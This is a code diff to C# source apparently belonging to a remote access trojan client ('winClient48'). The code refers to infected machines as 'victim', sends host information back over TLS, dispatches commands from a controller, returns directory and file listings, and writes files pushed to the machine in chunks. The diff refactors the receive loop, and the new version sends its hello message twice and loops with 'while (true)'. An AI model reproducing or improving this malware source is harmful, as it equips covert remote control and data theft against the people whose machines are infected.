@@ -428,88 +428,67 @@ namespace winClient48
             }
         }
 
-        /// <summary>
-        /// TLS handler.
-        /// </summary>
-        /// <param name="victim"></param>
         void fnTlsRecv(clsVictim victim)
         {
             try
             {
+                const int CMD_TLS = 1;
+                const int PARA_HELLO = 0;
+                const int PARA_ACK = 1;
+
                 SslStream sslClnt = victim.m_sslClnt;
                 clsDSP dsp = null;
 
                 int nRecv = 0;
-                byte[] abStaticRecvBuffer = new byte[clsVictim.MAX_BUFFER_LENGTH];
+                byte[] abStaticRecvBuffer;
                 byte[] abDynamicRecvBuffer = { };
 
-                victim.fnSslSendRAW(1, 0, clsEZData.fnGenerateRandomStr());
+                victim.fnSslSendRAW(CMD_TLS, PARA_HELLO, clsEZData.fnGenerateRandomStr());
 
+                victim.fnSslSendRAW(1, 0, clsEZData.fnGenerateRandomStr()); 
                 new Thread(() => SendInfo(victim)).Start();
 
                 do
                 {
                     abStaticRecvBuffer = new byte[clsVictim.MAX_BUFFER_LENGTH];
                     nRecv = sslClnt.Read(abStaticRecvBuffer, 0, abStaticRecvBuffer.Length);
-                    abDynamicRecvBuffer = CombineBytes(abDynamicRecvBuffer, 0, abDynamicRecvBuffer.Length, abStaticRecvBuffer, 0, nRecv);
 
                     if (nRecv <= 0)
                         break;
-                    else if (abDynamicRecvBuffer.Length < clsDSP.HEADER_SIZE)
-                        continue;
-                    else
+
+                    abDynamicRecvBuffer = CombineBytes(
+                        abDynamicRecvBuffer, 0, abDynamicRecvBuffer.Length,
+                        abStaticRecvBuffer, 0, nRecv);
+
+                    while (abDynamicRecvBuffer.Length >= clsDSP.HEADER_SIZE)
                     {
                         var header = clsDSP.GetHeader(abDynamicRecvBuffer);
-                        while (abDynamicRecvBuffer.Length - clsDSP.HEADER_SIZE >= header.len)
+                        if (abDynamicRecvBuffer.Length - clsDSP.HEADER_SIZE < header.len)
+                            break;
+
+                        dsp = new clsDSP(abDynamicRecvBuffer);
+                        abDynamicRecvBuffer = dsp.MoreData;
+
+                        int cmd = header.cmd;
+                        int para = header.para;
+                        byte[] msg = dsp.GetMsg().msg;
+
+                        if (cmd == CMD_TLS && para == PARA_ACK)
                         {
-                            dsp = new clsDSP(abDynamicRecvBuffer);
-                            abDynamicRecvBuffer = dsp.MoreData;
-                            header = clsDSP.GetHeader(abDynamicRecvBuffer);
-
-                            byte[] abBuffer = dsp.GetMsg().msg;
-
-                            int nCmd = header.cmd;
-                            int nParam = header.para;
-
-                            if (nCmd == 0)
+                            //new Thread(() => SendInfo(victim)).Start();
+                        }
+                        else if (cmd == 2)
+                        {
+                            if (para == 0)
                             {
-                                if (nParam == 0)
-                                {
-                                    string szPlain = Encoding.UTF8.GetString(abBuffer);
-                                    List<string> lsMsg = szPlain.Split('|').ToList();
+                                string szPlain = Encoding.UTF8.GetString(msg); 
 
-                                    Task.Run(() =>
-                                    {
-                                        try
-                                        {
-                                            _Received(victim, szPlain);
-                                        }
-                                        catch
-                                        {
-
-                                        }
-                                    });
-                                }
-                            }
-                            else if (nCmd == 1)
-                            {
-                                
-                            }
-                            else if (nCmd == 2)
-                            {
-                                if (nParam == 0)
-                                {
-                                    
-                                }
-                                else if (nParam == 1)
-                                {
-                                    //victim.fnSslSendRAW(2, 1, clsEZData.fnGenerateRandomStr());
-                                }
+                                _ = Task.Run(() => _Received(victim, szPlain));
                             }
                         }
                     }
                 }
-                while (nRecv > 0 && is_connected);
+                while (true);
             }
             catch (Exception ex)
             {
@@ -904,7 +883,7 @@ namespace winClient48
                         List<string[]> l_dir = val.Item3;
                         List<string[]> l_file = val.Item4;
 
-                        string data = string.Join("+", l_dir.Select(x => string.Join(";", x))) + "|" + string.Join("+", l_file.Select(x => string.Join(";", x))); //funcFile.ScanDir(dir, dir_limit, file_limit);
+                        string data = string.Join("*", l_dir.Select(x => string.Join(";", x))) + "|" + string.Join("*", l_file.Select(x => string.Join(";", x))); //funcFile.ScanDir(dir, dir_limit, file_limit);
                         if (data.Contains("|"))
                         {
                             string[] dataSplit = data.Split('|');
@@ -967,6 +946,10 @@ namespace winClient48
 
                                 long file_len = long.Parse(cmd[5]);
                                 int idx = int.Parse(cmd[6]);
+
+                                if (idx == 0 && g_packetwriter.ContainsKey(filename))
+                                    g_packetwriter.Remove(filename);
+
                                 byte[] data = Convert.FromBase64String(cmd[7]);
 
                                 if (!g_packetwriter.ContainsKey(filename))
